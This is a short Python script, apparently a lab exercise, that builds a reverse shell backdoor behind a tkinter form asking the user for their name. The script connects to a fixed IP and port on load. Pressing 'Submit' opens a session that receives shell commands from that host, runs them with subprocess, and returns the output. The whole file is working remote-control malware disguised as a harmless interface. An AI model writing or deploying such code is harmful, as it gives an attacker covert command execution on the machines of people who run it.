import subprocess
import socket
import os

import tkinter as tk

HOST = "192.168.56.1"
PORT = 9988

client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client.connect((HOST,PORT))
active = True


def make_session():
    client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    client.connect((HOST,PORT))
    active = True
    while active:
        try:
            command = client.recv(4096).decode('ascii')
            if command[:2] == "cd" and len(command) > 3:
                os.chdir(command[3:])

            task = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            stdout,stderr = task.communicate()
            data = stdout.decode() + stderr.decode() #gives the error
            client.send(data.encode('ascii'))
        except:
            client.close()
            active = False



window = tk.Tk()
window.title = "Backdoor GUI"
name_label = "Your name"

label1 = tk.Label(window, text="Enter your name below")
label1.pack(padx=15, pady=10)

label = tk.Label(window, textvariable=name_label)
label.pack(padx=15, pady=10)

text_input = tk.Entry(window, textvariable=name_label)
text_input.pack(padx=15, pady=10)

butt = tk.Button(text="Submit", command=make_session)
butt.pack(padx=15, pady=10)
window.mainloop()

